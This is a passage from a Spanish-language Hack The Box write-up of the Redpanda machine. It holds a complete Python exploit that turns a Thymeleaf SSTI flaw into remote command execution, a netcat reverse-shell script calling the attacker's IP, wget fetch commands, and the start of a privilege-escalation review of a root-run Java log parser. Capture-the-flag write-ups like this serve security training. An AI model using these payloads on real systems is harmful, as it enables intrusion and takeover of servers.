# https://commons.apache.org/proper/commons-io/javadocs/api-2.4/org/apache/commons/io/package-use.html
# https://docs.oracle.com/javase/8/docs/api/java/lang/package-summary.html
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Es importante saber que estas ejecutando, no lo olviden</p></div></blockquote><p>Con la misma mecánica hice un script en <code class="language-plaintext highlighter-rouge">python</code> para una <strong>Ejecución remota de comandos</strong>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span> <span class="c1"># pip3 install requests
</span><span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1"># pip3 install BeautifulSoup4 &amp;&amp; pip3 install lxml
</span><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="c1"># ctrl + c
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] Interrupted.'</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>

<span class="c1"># help panel
</span><span class="k">def</span> <span class="nf">help</span><span class="p">():</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">[*] Use: python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;command&gt;'</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="c1"># valid input
</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span> <span class="n">help</span><span class="p">()</span>

<span class="c1"># variables
</span><span class="n">target</span> <span class="o">=</span> <span class="s">'http://10.10.11.170:8080/search'</span>
<span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># create payload (SSTI java)
</span><span class="k">def</span> <span class="nf">create_inyection</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">cmd_convertion</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
        <span class="n">ascii_character</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">character</span><span class="p">)</span> <span class="c1"># 97 = ord('a')
</span>        <span class="n">java_convertion</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'T(java.lang.Character).toString(</span><span class="si">{</span><span class="n">ascii_character</span><span class="si">}</span><span class="s">)'</span>
        <span class="c1"># convertion by position (brackets)
</span>        <span class="k">if</span> <span class="n">pos</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">cmd_convertion</span> <span class="o">+=</span> <span class="n">java_convertion</span> <span class="o">+</span> <span class="s">'.concat('</span>
        <span class="k">elif</span> <span class="n">pos</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">cmd_convertion</span> <span class="o">+=</span> <span class="p">(</span><span class="n">java_convertion</span> <span class="o">+</span> <span class="s">').concat('</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">cmd_convertion</span> <span class="o">+=</span> <span class="p">(</span><span class="n">java_convertion</span> <span class="o">+</span> <span class="s">')'</span><span class="p">)</span>
        <span class="n">pos</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="s">'*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream())}'</span> <span class="o">%</span> <span class="n">cmd_convertion</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="c1"># make post request
</span><span class="k">def</span> <span class="nf">make_request</span><span class="p">():</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>

        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span> <span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">}</span>
        <span class="n">post_data</span> <span class="o">=</span> <span class="s">'name='</span> <span class="o">+</span> <span class="n">create_inyection</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>

        <span class="n">b_response</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'lxml'</span><span class="p">)</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">b_response</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">class_</span><span class="o">=</span><span class="s">'searched'</span><span class="p">)</span>

        <span class="k">print</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">string</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'You searched for: '</span><span class="p">,</span> <span class="s">''</span><span class="p">))</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="sa">f</span><span class="s">'[x] </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">make_request</span><span class="p">()</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Redpanda/ssti/ssti_rce.py">https://github.com/E1P0TR0</a></p></div></blockquote><p>Ahora solo pasamos un archivo con una <strong>reverse shell</strong>, luego la ejecutamos, recibiremos la shell del usuario <code class="language-plaintext highlighter-rouge">woodenk</code> y conseguimos la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="go">❯ cat rce.sh
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: rce.sh
───────┼─────────────────────────────────────────────────────────────────────────────────
</span><span class="gp">   1   │ #</span><span class="o">!</span>/bin/sh
<span class="go">   2   │
</span><span class="gp">   3   │ rm /tmp/f;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.88 1234 <span class="o">&gt;</span>/tmp/f
<span class="go">───────┴─────────────────────────────────────────────────────────────────────────────────
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [22/Sep/2022 19:21:12] "GET /rce.sh HTTP/1.1" 200 -

─────────────────────────────────────────────────────────────────────────────────────────
❯ python3 ssti_rce.py

</span><span class="gp">[*] Use: python3 ssti_rce.py &lt;command&gt;</span><span class="w">
</span><span class="go">
❯ python3 ssti_rce.py 'wget http://10.10.14.88/rce.sh'
❯ python3 ssti_rce.py 'bash rce.sh'

─────────────────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.170.
Ncat: Connection from 10.10.11.170:36570.
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root woodenk 33 Sep 22 04:50 /home/woodenk/user.txt
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes preguntarte por que no solo extraímos la <strong>llave privada</strong> y nos conectamos por <strong>SSH</strong>, la respuesta la veremos mas adelante…</p></div></blockquote><p>Ya que tenemos acceso al servidor, a continuación validamos las malas prácticas que nos proporcionaron explotar las vulnerabilidades anteriores:</p><blockquote><p>SSTI (file:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java)</p></blockquote><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="o">...</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">filter</span><span class="o">(</span><span class="nc">String</span> <span class="n">arg</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span><span class="o">[]</span> <span class="n">no_no_words</span> <span class="o">=</span> <span class="o">{</span><span class="s">"%"</span><span class="o">,</span> <span class="s">"_"</span><span class="o">,</span><span class="s">"$"</span><span class="o">,</span> <span class="s">"~"</span><span class="o">,</span> <span class="o">};</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">word</span> <span class="o">:</span> <span class="n">no_no_words</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span><span class="o">(</span><span class="n">arg</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">word</span><span class="o">)){</span>
                <span class="k">return</span> <span class="s">"Error occured: banned characters"</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">arg</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">...</span>
</pre></table></code></div></div><p>También confirmamos motor de plantilla <strong>THymeleaf</strong> (file:/opt/panda_search/pom.xml)</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>...
    <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-thymeleaf<span class="nt">&lt;/artifactId&gt;</span>
...
</pre></table></code></div></div><blockquote><p>Conceptos:</p><p>pom.xml (Project Object Model) contiene información sobre dependencias, configuraciones e información importante del proyecto en Maven</p><p>Maven es una herramienta de software para la gestión y construcción de proyectos Java</p></blockquote><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Antes de seguir no olvidar hacer un <strong>Tratamiento de la TTY</strong> para poder desplazarnos mejor por la consola. Luego hacemos un reconocimiento básico del sistema y empezamos a listar procesos del sistema sin permisos privilegiados, para ello usamos la herramienta <code class="language-plaintext highlighter-rouge">pspy</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="gp">woodenk@redpanda:/tmp/.privesc$</span><span class="w"> </span>./pspy64
<span class="go">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/
usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
</span><span class="c">...
</span><span class="go">2022/09/23 01:00:44 CMD: UID=0    PID=875    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
2022/09/23 01:00:44 CMD: UID=0    PID=865    | /usr/sbin/atd -f
2022/09/23 01:00:44 CMD: UID=0    PID=864    | sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
2022/09/23 01:00:44 CMD: UID=0    PID=863    | /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar [1]
</span><span class="c">...
</span><span class="go">2022/09/23 01:02:01 CMD: UID=0    PID=42084  | /bin/sh -c /root/run_credits.sh
2022/09/23 01:02:01 CMD: UID=0    PID=42083  | /usr/sbin/CRON -f
2022/09/23 01:02:01 CMD: UID=0    PID=42085  | /bin/sh /root/run_credits.sh
2022/09/23 01:02:01 CMD: UID=0    PID=42086  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar [2]
</span><span class="c">...
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes descargar la herramienta en su repositorio <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p></div></blockquote><p><strong>[1]</strong> Primero observamos que se ejecuta el archivo <code class="language-plaintext highlighter-rouge">.jar</code> <em>/opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar</em>, que como indica su nombre, es la aplicación panda_search, que es la web en sí. Y como vemos en el comando, lo ejecuta como el usuario <code class="language-plaintext highlighter-rouge">woodenk</code> y los permisos <code class="language-plaintext highlighter-rouge">logs</code>, permitiendonos así tener esos privilegios ya que nosotros aplicamos la <strong>Ejecución Remota de comandos</strong> por la web</p><p><strong>[2]</strong> Por otro lado, vemos que el usuario <code class="language-plaintext highlighter-rouge">root</code> ejecuta otra aplicación en <strong>Java</strong>, lo cuál puede ser interesante</p><p>Lo primero que hacemos es trernos el archivo para examinarlo un poco, y al descomprimirlo encontramos el siguiente archivo:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">❯ ls
 com   META-INF   org   final-1.0-jar-with-dependencies.jar
❯ cat META-INF/MANIFEST.MF
───────┬──────────────────────────────────────────────────────────
       │ File: META-INF/MANIFEST.MF
───────┼──────────────────────────────────────────────────────────
   1   │ Manifest-Version: 1.0
   2   │ Archiver-Version: Plexus Archiver
   3   │ Created-By: Apache Maven
   4   │ Built-By: root
   5   │ Build-Jdk: 11.0.15
   6   │ Main-Class: com.logparser.App
   7   │ 
───────┴──────────────────────────────────────────────────────────
</span></pre></table></code></div></div><p>El archivo <strong>MANIFEST.MF</strong> contiene los metadatos del grupo de archivos que forman parte del programa (.jar). Y como menciona en el campo <strong>Main-Class</strong>, sabemos que la clase principal es <strong>com.logparser.App</strong>. Entonces volvemos a la máquina víctima y lo encontramos:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.logparser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.BufferedWriter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileWriter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.drew.imaging.jpeg.JpegMetadataReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.imaging.jpeg.JpegProcessingException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.metadata.Directory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.metadata.Metadata</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.metadata.Tag</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.jdom2.JDOMException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.input.SAXBuilder</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.output.Format</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.output.XMLOutputter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">App</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Map</span> <span class="nf">parseLog</span><span class="o">(</span><span class="nc">String</span> <span class="n">line</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span><span class="o">[]</span> <span class="n">strings</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">"\\|\\|"</span><span class="o">);</span>
        <span class="nc">Map</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"status_code"</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">strings</span><span class="o">[</span><span class="mi">0</span><span class="o">]));</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"ip"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">1</span><span class="o">]);</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"user_agent"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">2</span><span class="o">]);</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"uri"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">3</span><span class="o">]);</span>
        

        <span class="k">return</span> <span class="n">map</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isImage</span><span class="o">(</span><span class="nc">String</span> <span class="n">filename</span><span class="o">){</span>
        <span class="k">if</span><span class="o">(</span><span class="n">filename</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">".jpg"</span><span class="o">))</span>
        <span class="o">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">getArtist</span><span class="o">(</span><span class="nc">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">JpegProcessingException</span>
    <span class="o">{</span>
        <span class="nc">String</span> <span class="n">fullpath</span> <span class="o">=</span> <span class="s">"/opt/panda_search/src/main/resources/static"</span> <span class="o">+</span> <span class="n">uri</span><span class="o">;</span>
        <span class="nc">File</span> <span class="n">jpgFile</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">fullpath</span><span class="o">);</span>
        <span class="nc">Metadata</span> <span class="n">metadata</span> <span class="o">=</span> <span class="nc">JpegMetadataReader</span><span class="o">.</span><span class="na">readMetadata</span><span class="o">(</span><span class="n">jpgFile</span><span class="o">);</span>
        <span class="k">for</span><span class="o">(</span><span class="nc">Directory</span> <span class="n">dir</span> <span class="o">:</span> <span class="n">metadata</span><span class="o">.</span><span class="na">getDirectories</span><span class="o">())</span>
        <span class="o">{</span>
            <span class="k">for</span><span class="o">(</span><span class="nc">Tag</span> <span class="n">tag</span> <span class="o">:</span> <span class="n">dir</span><span class="o">.</span><span class="na">getTags</span><span class="o">())</span>
            <span class="o">{</span>
                <span class="k">if</span><span class="o">(</span><span class="n">tag</span><span class="o">.</span><span class="na">getTagName</span><span class="o">()</span> <span class="o">==</span> <span class="s">"Artist"</span><span class="o">)</span>
                <span class="o">{</span>
                    <span class="k">return</span> <span class="n">tag</span><span class="o">.</span><span class="na">getDescription</span><span class="o">();</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="s">"N/A"</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">addViewTo</span><span class="o">(</span><span class="nc">String</span> <span class="n">path</span><span class="o">,</span> <span class="nc">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">JDOMException</span><span class="o">,</span> <span class="nc">IOException</span>
    <span class="o">{</span>
        <span class="nc">SAXBuilder</span> <span class="n">saxBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SAXBuilder</span><span class="o">();</span>
        <span class="nc">XMLOutputter</span> <span class="n">xmlOutput</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLOutputter</span><span class="o">();</span>
        <span class="n">xmlOutput</span><span class="o">.</span><span class="na">setFormat</span><span class="o">(</span><span class="nc">Format</span><span class="o">.</span><span class="na">getPrettyFormat</span><span class="o">());</span>

        <span class="nc">File</span> <span class="n">fd</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
        
        <span class="nc">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">saxBuilder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">fd</span><span class="o">);</span>
        
        <span class="nc">Element</span> <span class="n">rootElement</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="na">getRootElement</span><span class="o">();</span>
 
        <span class="k">for</span><span class="o">(</span><span class="nc">Element</span> <span class="nl">el:</span> <span class="n">rootElement</span><span class="o">.</span><span class="na">getChildren</span><span class="o">())</span>
        <span class="o">{</span>
    
            
            <span class="k">if</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">==</span> <span class="s">"image"</span><span class="o">)</span>
            <span class="o">{</span>
                <span class="k">if</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"uri"</span><span class="o">).</span><span class="na">getText</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">uri</span><span class="o">))</span>
                <span class="o">{</span>
                    <span class="nc">Integer</span> <span class="n">totalviews</span> <span class="o">=</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"totalviews"</span><span class="o">).</span><span class="na">getText</span><span class="o">())</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Total views:"</span> <span class="o">+</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">));</span>
                    <span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"totalviews"</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="nc">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">));</span>
                    <span class="nc">Integer</span> <span class="n">views</span> <span class="o">=</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"views"</span><span class="o">).</span><span class="na">getText</span><span class="o">());</span>
                    <span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"views"</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="nc">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">views</span> <span class="o">+</span> <span class="mi">1</span><span class="o">));</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="nc">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedWriter</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileWriter</span><span class="o">(</span><span class="n">fd</span><span class="o">));</span>
        <span class="n">xmlOutput</span><span class="o">.</span><span class="na">output</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="n">writer</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">JDOMException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">JpegProcessingException</span> <span class="o">{</span>
        <span class="nc">File</span> <span class="n">log_fd</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="s">"/opt/panda_search/redpanda.log"</span><span class="o">);</span>
        <span class="nc">Scanner</span> <span class="n">log_reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Scanner</span><span class="o">(</span><span class="n">log_fd</span><span class="o">);</span>
        <span class="k">while</span><span class="o">(</span><span class="n">log_reader</span><span class="o">.</span><span class="na">hasNextLine</span><span class="o">())</span>
        <span class="o">{</span>
            <span class="nc">String</span> <span class="n">line</span> <span class="o">=</span> <span class="n">log_reader</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
            <span class="k">if</span><span class="o">(!</span><span class="n">isImage</span><span class="o">(</span><span class="n">line</span><span class="o">))</span>
            <span class="o">{</span>
                <span class="k">continue</span><span class="o">;</span>
            <span class="o">}</span>
            <span class="nc">Map</span> <span class="n">parsed_data</span> <span class="o">=</span> <span class="n">parseLog</span><span class="o">(</span><span class="n">line</span><span class="o">);</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"uri"</span><span class="o">));</span>
